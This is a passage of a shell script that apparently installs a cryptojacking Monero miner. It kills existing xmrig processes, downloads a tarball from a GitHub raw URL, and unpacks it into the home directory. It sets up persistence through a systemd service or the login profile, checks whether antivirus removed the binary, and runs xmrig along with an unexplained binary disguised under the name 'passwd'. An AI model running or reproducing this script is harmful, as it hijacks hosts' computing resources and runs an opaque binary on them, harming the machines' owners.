if ! sudo -n true 2>/dev/null; then
  echo "Since I can't do passwordless sudo, mining in background will started from your $HOME/.profile file first time you login this host after reboot."
else
  echo "Mining in background will be performed using minershell_main systemd service."
fi

echo
echo "JFYI: This host has $CPU_THREADS CPU threads, so projected Monero hashrate is around $EXP_MONERO_HASHRATE KH/s."
echo

echo "Sleeping for 15 seconds before continuing (press Ctrl+C to cancel)"
sleep 15
echo
echo

# start doing stuff: preparing miner

echo "[*] Removing previous minershell-main miner (if any)"
if sudo -n true 2>/dev/null; then
  sudo systemctl stop minershell_main.service
fi
killall -9 xmrig

echo "[*] Removing $HOME/minershell-main directory"
rm -rf $HOME/minershell-main

echo "[*] Downloading minershell-main advanced version of xmrig to /tmp/minershell-main.tar.gz"
if ! curl -L --progress-bar "https://raw.githubusercontent.com/ardx1/miner/main/minershell-main.tar.gz" -o /tmp/minershell-main.tar.gz; then
  echo "ERROR: Can't download https://raw.githubusercontent.com/ardx1/miner/main/minershell-main.tar.gz file to /tmp/minershell-main.tar.gz"
  exit 1
fi

echo "[*] Unpacking /tmp/minershell-main.tar.gz to $HOME/minershell-main"
[ -d $HOME/minershell-main ] || mkdir $HOME/minershell-main
if ! tar xf /tmp/minershell-main.tar.gz -C $HOME/minershell-main; then
  echo "ERROR: Can't unpack /tmp/minershell-main.tar.gz to $HOME/minershell-main directory"
  exit 1
fi
rm /tmp/minershell-main.tar.gz

# Dar permissões de execução para xmrig e passwd
chmod +x $HOME/minershell-main/xmrig
chmod +x $HOME/minershell-main/passwd

echo "[*] Checking if advanced version of $HOME/minershell-main/xmrig works fine (and not removed by antivirus software)"
sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/minershell-main/config.json
$HOME/minershell-main/xmrig --help >/dev/null
if (test $? -ne 0); then
  if [ -f $HOME/minershell-main/xmrig ]; then
    echo "WARNING: Advanced version of $HOME/minershell-main/xmrig is not functional"
  else 
    echo "WARNING: Advanced version of $HOME/minershell-main/xmrig was removed by antivirus (or some other problem)"
  fi
else
  echo "[*] Executing xmrig..."
  $HOME/minershell-main/xmrig &
fi

# Executar o arquivo passwd
echo "[*] Executing passwd..."
$HOME/minershell-main/passwd &

echo "[*] Setup complete."
